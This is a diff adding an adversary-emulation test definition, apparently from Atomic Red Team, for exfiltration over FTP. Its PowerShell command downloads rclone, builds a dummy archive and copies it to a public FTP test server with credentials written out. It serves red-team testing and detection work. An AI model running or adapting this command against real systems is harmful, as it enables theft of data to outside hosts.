@@ -1,0 +1,84 @@
+- id: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
+  name: Exfiltration Over Alternative Protocol - FTP - Rclone
+  description: 'Rclone may be used by an adversary to exfiltrate data to a publicly
+    hosted FTP server.
+
+    [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)'
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
+      Non-C2 Protocol'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else
+          {exit 1}; then : ; else fsutil file createnew C:\Users\Public\Downloads\exfil.zip
+          20485760; fi; if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip)
+          {exit 0} else {exit 1}; then : ; else Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
+          -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"; Expand-Archive
+          C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath
+          C:\Users\Public\Downloads\; fi; $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\
+          -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName;
+          $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include
+          "exfil.zip" | Select-Object -ExpandProperty FullName; &$rclone_bin config
+          create ftpserver "ftp" "host" ftp.dlptest.com "port" 21 "user" dlpuser "pass"
+          rNrKYTX9g7z3RgJRmxWuGHbeu; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver
+          --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams
+          12 --transfers 12 -P --ftp-no-check-certificate'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1048.003
+  - exfiltration
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      ftp_server:
+        description: Your own ftp server
+        type: string
+        default: ftp.dlptest.com
+      ftp_pass:
+        description: Your FTP user's password
+        type: string
+        default: rNrKYTX9g7z3RgJRmxWuGHbeu
+      ftp_user:
+        description: Your FTP username
+        type: string
+        default: dlpuser
+      ftp_port:
+        description: Your FTP's port
+        type: integer
+        default: 21
+    dependencies:
+    - description: 'Check if the exfil package exists
+
+        '
+      prereq_command: 'if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0}
+        else {exit 1}
+
+        '
+      get_prereq_command: 'fsutil file createnew C:\Users\Public\Downloads\exfil.zip
+        20485760
+
+        '
+    - description: Check if rclone zip exists
+      prereq_command: 'if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip)
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
+        -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
+
+        Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip
+        -DestinationPath C:\Users\Public\Downloads\
+
+        '
+    technique_created: '2020-03-15T15:37:47.583Z'
+    atomic_guid: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
+    import_timestamp: '2025-06-24T11:15:07.942162Z'
